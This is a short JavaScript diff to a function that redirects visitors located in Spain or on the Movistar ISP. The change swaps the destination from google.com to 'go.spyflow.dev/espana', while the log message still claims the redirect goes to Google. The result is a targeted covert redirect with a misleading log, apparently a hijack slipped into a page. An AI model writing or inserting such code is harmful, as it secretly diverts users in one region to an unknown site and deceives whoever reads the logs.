@@ -22,7 +22,7 @@ function checkAndRedirect() {
       // Redirigir si el país es España o si el ISP/ORG contiene Movistar
       if (country === 'ES' || (isp && isp.includes('Movistar'))) {
         console.log('[INFO] Condición cumplida, redirigiendo a https://www.google.com');
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://go.spyflow.dev/espana';
       } else {
         console.log('[INFO] Condición no cumplida, no se realiza redirección.');
       }
